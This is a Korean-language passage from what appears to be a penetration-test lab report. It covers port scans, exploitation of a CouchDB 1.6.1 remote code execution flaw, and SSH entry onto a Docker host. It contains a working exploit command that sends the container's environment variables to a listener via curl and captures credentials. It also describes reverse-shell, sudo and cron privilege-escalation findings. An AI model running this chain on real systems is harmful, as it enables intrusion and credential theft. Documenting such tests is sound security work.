2. WordPress 플러그인 업로드 악용
악성 플러그인 업로드를 통해 웹 서버 원격 명령 실행 가능하여, 리버스 쉘 명령어를 실행시켜 쉘을 얻을수 있었음.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-redraccoon-report/image-14.png)
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-redraccoon-report/image-15.png)
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-redraccoon-report/image-16.png)

3. sudo 설정 오류
www-data 계정이 NOPASSWD sudo 명령 실행 가능하여 root 권한 획득 가능하였음.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-redraccoon-report/image-17.png)


# 호스트 TARGET_IP

## 모의해킹 수행 내용
### 정보 수집

대상 호스트의 아이피주소를 상대로 모든 TCP 포트들의 상태를 알아보기 위해 TCP SYN 스캔을 이용해 포트스캐닝을 진행했다.
```
└─# nmap -sS -p- --max-retries 1 -Pn -n --open TARGET_IP --min-rate 1500 -oA fullport
Starting Nmap 7.94 ( https://nmap.org ) at 2026-02-17 18:10 UTC
Nmap scan report for TARGET_IP
Host is up (0.00020s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5984/tcp open  couchdb
MAC Address: 0A:7E:67:12:82:7F (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.80 seconds
```

포트 스캔 결과 포트 22,80,5984 이 열려있었고, 다른 포트들은 모두 닫히거나 필터링 된 상태였다. 해당 포트에서 어떤 종류의 네트워크 서비스들이 실행중인지 알아보기 위해 서비스 배너 그래빙과 Nmap 기본 스크립트를 이용해 더 자세한 정보 수집을 진행했다.
```
└─# nmap -p 22,80,5984 -sV -sC -Pn -n --open TARGET_IP --min-rate 1000 -oA tcpDetailed
Starting Nmap 7.94 ( https://nmap.org ) at 2026-02-17 18:15 UTC
Nmap scan report for TARGET_IP
Host is up (0.00013s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 18:51:56:17:38:ca:3c:da:0d:94:4b:ce:79:69:1b:8d (ECDSA)
|_  256 49:61:03:53:8f:fa:86:47:df:44:f7:6e:e8:3d:f0:fa (ED25519)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/17)
|_http-server-header: CouchDB/1.6.1 (Erlang OTP/17)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
MAC Address: 0A:7E:67:12:82:7F (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.75 seconds
```

nmap을 통해 발견한 CouchDB 1.6.1버전 취약점 검색 시 RCE PoC가 있는것을 확인함.
```
└─$ searchsploit CouchDB 1.6.1      
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache CouchDB < 2.1.0 - Remote Code Execution                                                                                                                                   | linux/webapps/44913.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

### 도커 초기 침투

익스플로잇을 사용하여 리버스 쉘을 시도했지만 호스트가 netcat이 없어 실행되지 않아서 curl을 통해 env 파일 조회 시도함.
```
└─# python 44913.py http://TARGET_IP:5984 --priv -c "env | curl -X POST --data-binary @- http://TARGET_IP/"                       

[*] Detected CouchDB Version 1.6.1
[+] User guest with password [REDACTED_PASSWORD] successfully created.
[+] Created payload at: http://TARGET_IP:5984/_config/query_servers/cmd
[+] Command executed: env | curl -X POST --data-binary @- http://TARGET_IP/
[*] Cleaning up.
```

공격자 pc에서 netcat으로 80번을 열어두어 env 파일을 얻는것을 성공하였으며, [REDACTED_USER]/[REDACTED_PASSWORD] 계정 탈취에 성공함.
```
└─# nc -lvnp 80              
listening on [any] 80 ...
connect to [TARGET_IP] from (UNKNOWN) [TARGET_IP] 48078
POST / HTTP/1.1
User-Agent: curl/7.38.0
Host: TARGET_IP
Accept: */*
Content-Length: 796
Content-Type: application/x-www-form-urlencoded

kill -9 17738
COUCHDB_USER=[REDACTED_USER]
HOSTNAME=131a469400ad
SHLVL=0
HOME=/var/lib/couchdb
ERL_LIBS=:/usr/local/lib/couchdb/erlang/lib
EMU=beam
PROGNAME=erl
GPG_KEYS=15DD4F3B8AACA54740EB78C7B7B7C53943ECCEE1   1CFBFA43C19B6DF4A0CA3934669C02FFDF3CEBA3   25BBBAC113C1BFD5AA594A4C9F96B92930380381   4BFCA2B99BADC6F9F105BEC9C5E32E2D6B065BFB   5D680346FAA3E51B29DBCB681015F68F9DA248BC   7BCCEB868313DDA925DF1805ECA5BCB7BB9656B0   C3F4DFAEAD621E1C94523AEEC376457E61D50B88   D2B17F9DA23C0A10991AF2E3D9EE01E47852AEE4   E0AF0A194D55C84E4A19A801CDB0C0F904F4EE9B
BINDIR=/usr/lib/erlang/erts-6.2/bin
PATH=/usr/lib/erlang/erts-6.2/bin:/usr/lib/erlang/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
ROOTDIR=/usr/lib/erlang
PWD=/var/lib/couchdb
COUCHDB_PASSWORD=[REDACTED_PASSWORD]
COUCHDB_VERSION=1.6.1
```

ssh를 통해 dmzdbadmin 로그인 시도하여 도커 호스트에 침투 성공함.
```
└─# ssh [REDACTED_USER]@TARGET_IP
[REDACTED_USER]@TARGET_IP's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-1012-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Feb 18 03:00:33 UTC 2026

  System load:  0.0810546875      Processes:                113
  Usage of /:   33.5% of 7.57GB   Users logged in:          0
  Memory usage: 19%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                IPv4 address for ens5:    TARGET_IP


Expanded Security Maintenance for Applications is not enabled.

73 updates can be applied immediately.
46 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Feb 18 02:44:16 2026 from TARGET_IP
$ id; hostname; ip a
uid=1001(dmzdbadmin) gid=1001(dmzdbadmin) groups=1001(dmzdbadmin)
dmz-prod-couchdb03
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000
    link/ether 0a:7e:67:12:82:7f brd ff:ff:ff:ff:ff:ff
    altname enp0s5
    inet TARGET_IP/28 metric 100 brd TARGET_IP scope global dynamic ens5
       valid_lft 1824sec preferred_lft 1824sec
    inet6 fe80::87e:67ff:fe12:827f/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:09:d9:7d:b2 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:9ff:fed9:7db2/64 scope link 
       valid_lft forever preferred_lft forever
5: vethe542c21@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether ba:93:d9:34:cd:27 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::b893:d9ff:fe34:cd27/64 scope link 
       valid_lft forever preferred_lft forever
$ Connection to TARGET_IP closed by remote host.
Connection to TARGET_IP closed.
```
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-redraccoon-report/1.png)

### 취약점 분석 및 증거 스크린샷 포함

1. CouchDB 원격 코드 실행
CouchDB 1.6.1 취약점을 통해 Docker 컨테이너 내부 명령 실행 가능하며, python exploit.py --priv -c "id" http://localhost:5984 형식으로 익스플로잇.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-redraccoon-report/image-19.png)

2. Cron 작업 권한 설정 오류
root 권한으로 실행되는 Cron 작업에서 실행 파일(/opt/backup/continuous-backup.py)에 대한 권한 검증이 미흡하여, 공격자가 해당 파일 또는 경로를 조작할 경우 임의 명령 실행 가능
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-redraccoon-report/image-18.png)




